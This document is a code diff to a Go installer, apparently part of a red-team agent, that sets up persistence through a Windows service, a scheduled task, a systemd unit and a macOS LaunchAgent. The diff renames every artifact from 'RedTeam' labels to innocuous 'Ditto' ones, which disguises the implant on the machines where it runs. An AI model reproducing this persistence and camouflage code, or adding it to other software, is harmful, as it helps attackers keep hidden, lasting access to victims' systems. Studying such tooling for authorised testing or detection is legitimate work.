@@ -60,12 +60,12 @@ func (i *Installer) installWindowsRegistry() error {
 
 func (i *Installer) installWindowsService() error {
 	// Install as Windows service
-	return createWindowsService("RedTeamService", i.targetPath)
+	return createWindowsService("DittoService", i.targetPath)
 }
 
 func (i *Installer) installWindowsScheduled() error {
 	// Install via Task Scheduler
-	return createScheduledTask("RedTeamTask", i.targetPath)
+	return createScheduledTask("DittoTask", i.targetPath)
 }
 
 func (i *Installer) installWindowsStartup() error {
@@ -92,7 +92,7 @@ func (i *Installer) installLinux() error {
 func (i *Installer) installLinuxSystemd() error {
 	// Install as systemd service
 	serviceContent := fmt.Sprintf(`[Unit]
-Description=Red Team Service
+Description=Ditto Service
 After=network.target
 
 [Service]
@@ -103,7 +103,7 @@ Restart=always
 [Install]
 WantedBy=multi-user.target`, i.targetPath)
 	
-	servicePath := "/etc/systemd/system/redteam.service"
+	servicePath := "/etc/systemd/system/ditto.service"
 	return writeServiceFile(servicePath, serviceContent)
 }
 
@@ -138,7 +138,7 @@ func (i *Installer) installDarwinLaunchd() error {
 <plist version="1.0">
 <dict>
 	<key>Label</key>
-	<string>com.redteam.agent</string>
+	<string>com.ditto.agent</string>
 	<key>ProgramArguments</key>
 	<array>
 		<string>%s</string>
@@ -150,7 +150,7 @@ func (i *Installer) installDarwinLaunchd() error {
 </dict>
 </plist>`, i.targetPath)
 	
-	plistPath := os.Getenv("HOME") + "/Library/LaunchAgents/com.redteam.agent.plist"
+	plistPath := os.Getenv("HOME") + "/Library/LaunchAgents/com.ditto.agent.plist"
 	return writeFile(plistPath, plistContent)
 }
 
